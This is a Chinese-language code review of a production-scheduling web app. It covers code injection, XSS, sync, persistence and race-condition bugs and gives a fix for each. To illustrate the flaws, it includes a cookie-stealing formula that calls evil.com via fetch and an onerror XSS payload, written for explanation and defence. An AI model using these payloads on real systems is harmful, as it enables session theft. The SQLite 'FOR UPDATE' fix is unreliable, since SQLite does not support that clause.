## 🔴 严重问题

### S1. 代码注入漏洞 — `evaluateFormula` 使用 `new Function()`

**位置**: `production-scheduler.html:267`

```javascript
const result = new Function('"use strict"; return (' + expr + ')')();
```

**问题**: 公式引擎使用 `new Function()` 执行用户自定义公式，等同于 `eval()`。用户可通过 `showFormulaModal()` 输入任意公式，没有任何白名单或沙箱限制。攻击者可构造如 `IF(1, fetch('http://evil.com?c='+document.cookie), 0)` 的公式窃取 Cookie。

**影响**: 任意 JavaScript 代码执行，可窃取用户数据、伪造操作、劫持会话。

**修复方案**: 使用安全的表达式解析器替代 `new Function()`，或限制只允许数字运算和预定义函数：

```javascript
// 方案1: 使用 math.js 库的安全表达式求值
import { evaluate } from 'mathjs'
const result = evaluate(expr, scope)

// 方案2: 白名单校验 — 只允许数字、运算符和已知函数名
const SAFE_PATTERN = /^[\d\s+\-*/().,%<>=!&|?:]+$|^(ROUND|ABS|MIN|MAX|FLOOR|CEIL|SUM|COUNT|AVG|IF)\(/i
if (!SAFE_PATTERN.test(expr)) return '#BLOCKED'
```

**修复原理**: 白名单方式从根本上阻止任意代码注入，只允许数学运算通过。

### S2. XSS 漏洞 — innerHTML 直接拼接未转义的用户数据

**位置**: `production-scheduler.html` 全文，典型行 378、401、406

```javascript
// 第406行 — styleNo 直接插入 HTML 属性
value="${s?.styleNo||''}"
```

**问题**: 整个 HTML 文件使用模板字符串 + `innerHTML` 渲染所有内容，用户输入的款号、颜色、客户名等字段未经 HTML 转义直接插入 DOM。如果款号为 `<img onerror=alert(1) src=x>`，将直接执行。

**影响**: 存储型 XSS，任何用户输入的恶意内容都会在所有客户端执行。

**修复方案**: 添加 HTML 转义函数并在所有插入点使用：

```javascript
function esc(s) {
  if (!s) return ''
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;')
}

// 使用方式
`<td><strong>${esc(s.styleNo)}</strong></td>`
`<input value="${esc(s?.styleNo||'')}">`
```

**修复原理**: 转义特殊字符使浏览器将其视为纯文本而非 HTML 标签。

### S3. 实时协作完全失效 — HTML 客户端事件名不匹配

**位置**: `production-scheduler.html:153` 和 `server.js:576`

**问题**: 服务端通过 `broadcastSection` 发出 `sectionUpdate` 事件，但 HTML 客户端监听的是 `dataUpdate`（第153行），该事件永远不会被触发。同时 HTML 客户端通过 `sendUpdate` 发出 `updateSection` 事件（第184行），服务端没有对应的处理器。

```javascript
// 服务端发出
io.emit('sectionUpdate', { section, data });

// HTML 客户端监听（永远不会触发）
socket.on('dataUpdate', (data) => { ... });

// HTML 客户端发出（服务端不处理）
socket.emit('updateSection', { section, data });
```

**影响**: HTML 客户端的多人协作功能完全不工作 — 其他用户的修改不会实时更新，自己的修改也不会同步给他人。数据只在本地生效。

**修复方案**: 统一事件名称，让 HTML 客户端使用与 Vue 客户端相同的事件：

```javascript
// HTML 客户端 — 替换 dataUpdate 为 sectionUpdate
socket.on('sectionUpdate', (msg) => {
  if (DB && msg.section) {
    DB[msg.section] = msg.data;
    render();
    flashUpdate();
  }
});

// 删除 sendUpdate 中的 socket.emit，改为调用 REST API
```

**修复原理**: 统一前后端事件协议，确保数据流畅通。

### S4. 日报和库存 API 不持久化数据

**位置**: `server.js:600-612` 和 `server.js:615-625`

```javascript
// 日报 — 只广播不存储
app.post('/api/daily', (req, res) => {
  broadcastSection('dailyReports', r);  // 内存中广播
  res.json({ ok: true });               // 无数据库写入
});

// 库存 — 同样只广播不存储
app.post('/api/inventory', (req, res) => {
  broadcastSection('inventory', r);
  res.json({ ok: true });
});
```

**影响**: 服务重启后所有日报和库存数据丢失。这是数据完整性问题。

**修复方案**: 创建对应的数据库表并在 API 中执行 INSERT：

```javascript
// db.js 中添加表
CREATE TABLE IF NOT EXISTS daily_reports (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  date TEXT, workshop TEXT, style_no TEXT, color TEXT,
  plan_qty INTEGER, actual_qty INTEGER, remark TEXT,
  created_at TEXT DEFAULT (datetime('now','localtime'))
);

// server.js 中修改 API
app.post('/api/daily', (req, res) => {
  const r = req.body;
  if (!r.styleNo) return res.status(400).json({ error: '款号不能为空' });
  const result = db.run('INSERT INTO daily_reports (date, workshop, style_no, color, plan_qty, actual_qty, remark) VALUES (?,?,?,?,?,?,?)',
    [r.date, r.workshop, r.styleNo, r.color, r.planQty || 0, r.actualQty || 0, r.remark || '']);
  broadcastSection('dailyReports', db.all('SELECT * FROM daily_reports ORDER BY date DESC'));
  res.json({ ok: true, id: result.lastInsertRowid });
});
```

### S5. 仓库出库竞态条件 — 库存检查和扣减非原子操作

**位置**: `server.js:464-474`

```javascript
// 步骤1: 检查库存
const inv = db.get('SELECT current_qty FROM warehouse_inventory WHERE ...');
if (!inv || inv.current_qty < r.qty) {
  return res.status(400).json({ error: '库存不足' });
}
// ← 此处另一个并发请求可能也通过了检查
// 步骤2: 扣减库存
updateInventory(req.params.type, r.style_no, r.color, r.size_spec, -r.qty);
```

**影响**: 并发出库时库存可能扣为负数。

**修复方案**: 使用数据库事务 + 行锁：

```javascript
const txn = db.getDb().transaction(() => {
  const inv = db.get('SELECT current_qty FROM warehouse_inventory WHERE warehouse_type = ? AND style_no = ? AND color = ? AND size_spec = ? FOR UPDATE',
    [req.params.type, r.style_no, r.color || '', r.size_spec || '']);
  if (!inv || inv.current_qty < r.qty) {
    throw new Error('库存不足');
  }
  // ... 执行出库和扣减
});
try { txn(); } catch (e) { return res.status(400).json({ error: e.message }); }
```

**修复原理**: SQLite 的事务天然串行化，`FOR UPDATE` 确保读-改-写在同一事务中完成。

### S6. useWebSocket 断线重连创建重复连接

**位置**: `garment-web/src/composables/useWebSocket.js:19-21`

```javascript
socket.on('disconnect', () => {
  connected.value = false
  setTimeout(connect, 3000)  // 创建新 socket，旧的未清理
})
```

**问题**: Socket.IO 自带自动重连机制。此处手动 `setTimeout(connect, 3000)` 会创建一个全新的 socket 实例，而旧的 socket 可能仍在重连，导致多个并行连接。

**影响**: 多个 socket 连接导致重复收到消息、状态混乱、服务端资源浪费。

**修复方案**: 移除手动重连，使用 Socket.IO 内置重连：

```javascript
socket = io('/', {
  transports: ['websocket', 'polling'],
  reconnection: true,
  reconnectionDelay: 3000,
  reconnectionAttempts: Infinity,
})
// 删除 setTimeout(connect, 3000)
```

**修复原理**: Socket.IO 的内置重连会正确处理旧连接清理和指数退避。

## 🟡 中等问题

### M1. 日期时区偏移 — `toISOString()` 使用 UTC

**位置**: `server.js:359`

```javascript
const dateStr = d.toISOString().split('T')[0];
```

**问题**: `toISOString()` 返回 UTC 时间。如果服务器在 UTC+8 时区，`2026-07-15 00:30:00+08:00` 会变成 `2026-07-14T16:30:00Z`，日期变成前一天。

**影响**: 排程日期在非 UTC 时区的服务器上可能全部偏移一天。

**修复方案**:

```javascript
function fmtLocal(d) {
  const y = d.getFullYear()
  const m = String(d.getMonth() + 1).padStart(2, '0')
  const day = String(d.getDate()).padStart(2, '0')
  return `${y}-${m}-${day}`
}
const dateStr = fmtLocal(d);
```

### M2. CORS 配置缺陷 — 通配符 origin 回显

**位置**: `server.js:24-29`

```javascript
if (ALLOWED_ORIGINS.includes('*') || ALLOWED_ORIGINS.includes(origin)) {
  res.header('Access-Control-Allow-Origin', origin || '*');
}
```

**问题**: 当配置为 `*` 时，回显请求的 `origin`。如果 origin 是 `null`（如 file:// 协议）或未定义，会回显 `*`，但 `origin` 可能是恶意站点。

**影响**: 可能被利用进行 CSRF 攻击。

**修复方案**: 严格匹配或直接使用 `*`：

```javascript
if (ALLOWED_ORIGINS.includes('*')) {
  res.header('Access-Control-Allow-Origin', '*');
} else if (origin && ALLOWED_ORIGINS.includes(origin)) {
  res.header('Access-Control-Allow-Origin', origin);
}
```

## 🟢 建议

### L1. production-scheduler.html 单文件过大（918行）

整个前端逻辑、样式、HTML 写在一个文件中，维护困难。建议拆分为独立的 CSS/JS 文件。

### L2. 缺少 TypeScript

所有前端代码使用纯 JavaScript，缺少类型检查。建议逐步迁移到 TypeScript，特别是 API 层和数据模型。

### L3. 缺少单元测试

项目没有测试文件。建议至少为核心业务逻辑（排程计算、库存扣减、公式引擎）添加单元测试。

### L4. 缺少数据库备份机制

SQLite 数据库无备份策略。建议添加定时备份或使用 WAL 模式配合文件快照。

### L5. API 缺少分页

`GET /api/styles`、`GET /api/main-plan` 等返回全量数据，数据量大时性能差。建议添加 `?page=1&size=20` 分页参数。

### L6. 缺少 rate limiting

无请求频率限制，可被恶意刷接口。建议使用 `express-rate-limit` 中间件。

### L7. Styles.vue 中 v-if 和 v-for 同元素

**位置**: `garment-web/src/views/Styles.vue:118`

```html
<el-tag v-for="t in ..." :key="t" v-if="t.trim()">{{ t.trim() }}</el-tag>
```

Vue 3 不推荐在同一元素上使用 `v-if` 和 `v-for`。建议用 `<template v-for>` 包裹或使用 `computed` 过滤。

### L8. production-scheduler.html 分页状态全局变量

**位置**: `production-scheduler.html:880`

```javascript
let paginationState = {};
```

全局变量在 Tab 切换时保持状态，可能导致数据与分页不匹配。

## 总体评估

| 维度 | 评分 | 说明 |
|------|------|------|
| 安全性 | ❌ 不通过 | 存在 XSS 和代码注入漏洞 |
| 数据完整性 | ❌ 不通过 | 日报/库存不持久化，出库有竞态 |
| 功能正确性 | ⚠️ 部分通过 | HTML 客户端协作不工作，VisualSchedule 不可用 |
| 代码质量 | ⚠️ 中等 | 有死代码，前后端数据结构不一致 |
| 性能 | ⚠️ 中等 | 缺少分页、外部 CDN 不可用 |

**结论**: 当前代码**不建议直接上线生产环境**。需要优先修复：
1. **S1 + S2**（安全漏洞）— 必须修复
2. **S3 + S4**（数据丢失和协作失效）— 必须修复
3. **S5**（库存竞态）— 必须修复
4. **M1-M4**（功能缺陷）— 强烈建议修复

修复上述问题后，Vue 版前端（`garment-web`）可以作为生产版本使用。HTML 版（`production-scheduler.html`）建议废弃或作为独立 demo。
